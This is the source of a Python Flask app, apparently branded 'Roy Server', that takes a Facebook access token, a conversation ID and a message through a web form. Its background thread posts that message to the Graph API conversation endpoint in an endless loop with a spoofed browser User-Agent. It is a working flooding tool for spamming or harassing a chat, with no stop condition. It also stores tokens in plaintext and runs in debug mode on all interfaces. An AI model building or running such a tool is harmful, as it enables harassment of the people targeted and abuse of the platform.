from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

# Data directory
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
CONVO_FILE = os.path.join(DATA_DIR, "convo.txt")
MESSAGE_FILE = os.path.join(DATA_DIR, "file.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

# Function to save form data
def save_data(token, convo_id, message_text, delay):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())
    with open(CONVO_FILE, "w") as f:
        f.write(convo_id.strip())
    with open(MESSAGE_FILE, "w") as f:
        f.write(message_text.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

# Function to send messages
def send_messages():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(CONVO_FILE, "r") as f:
            convo_id = f.read().strip()
        with open(MESSAGE_FILE, "r") as f:
            message_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not (token and convo_id and message_text):
            print("[!] Missing required data.")
            return

        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        headers = {'User-Agent': 'Mozilla/5.0', 'referer': 'www.google.com'}
        payload = {'access_token': token, 'message': message_text}

        while True:
            response = requests.post(url, json=payload, headers=headers)
            if response.ok:
                print(f"[+] Message sent: {message_text}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

# Function to keep server active
def ping_server():
    while True:
        time.sleep(600)  # 10 minutes
        try:
            response = requests.get('https://your_actual_server_url.com', timeout=10)
            print(f"Pinged server: {response.status_code}")
        except requests.RequestException as e:
            print(f"Ping error: {e}")

# HTML Template with Form + Branding Page
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Auto Messenger</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: white; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; background: #1f1f1f; padding: 20px; margin: 50px auto; border-radius: 10px; box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1); }
        h2 { color: #ffcc00; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin-top: 10px; }
        input, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
        button { margin-top: 20px; padding: 10px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #218838; }
        .message { color: green; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📩 Facebook Auto Messenger</h2>
        <form action="/" method="post">
            <label for="token">🔑 Access Token:</label>
            <input type="text" id="token" name="token" required>

            <label for="convo_id">💬 Conversation ID:</label>
            <input type="text" id="convo_id" name="convo_id" required>

            <label for="message_text">✉ Message:</label>
            <textarea id="message_text" name="message_text" rows="4" required></textarea>

            <label for="delay">⏳ Delay (Seconds):</label>
            <input type="number" id="delay" name="delay" value="5" min="1">

            <button type="submit">📤 Submit</button>
        </form>
        <p id="status" class="message"></p>
    </div>
</body>
</html>
"""

# Branding Page - Roy Server
ROY_SERVER_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roy Server - Created by Rocky Roy</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: white; text-align: center; padding: 50px; }
        .container { max-width: 600px; margin: auto; padding: 20px; background: #1f1f1f; border-radius: 10px; box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1); }
        h1 { color: #ffcc00; }
        p { font-size: 18px; }
        .footer { margin-top: 20px; font-size: 14px; opacity: 0.7; }
        a { color: #ffcc00; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 Roy Server - Created by Rocky Roy 🔥</h1>
        <p>Welcome to Roy Server! This platform is built to provide high-performance automation and messaging solutions.</p>
        <p>For any inquiries or collaborations, contact <a href="https://your-website.com" target="_blank">Rocky Roy</a>.</p>
        <div class="footer">
            <p>&copy; 2025 Roy Server. All Rights Reserved.</p>
        </div>
    </div>
</body>
</html>
"""

# Flask route to render HTML form
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token")
        convo_id = request.form.get("convo_id")
        message_text = request.form.get("message_text")
        delay = request.form.get("delay", 5)

        if token and convo_id and message_text:
            save_data(token, convo_id, message_text, delay)
            threading.Thread(target=send_messages, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

# Route for Roy Server Branding Page
@app.route("/roy-server")
def roy_server():
    return render_template_string(ROY_SERVER_PAGE)

# Start background tasks
ping_thread = threading.Thread(target=ping_server, daemon=True)
ping_thread.start()

# Start Flask server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, debug=True)
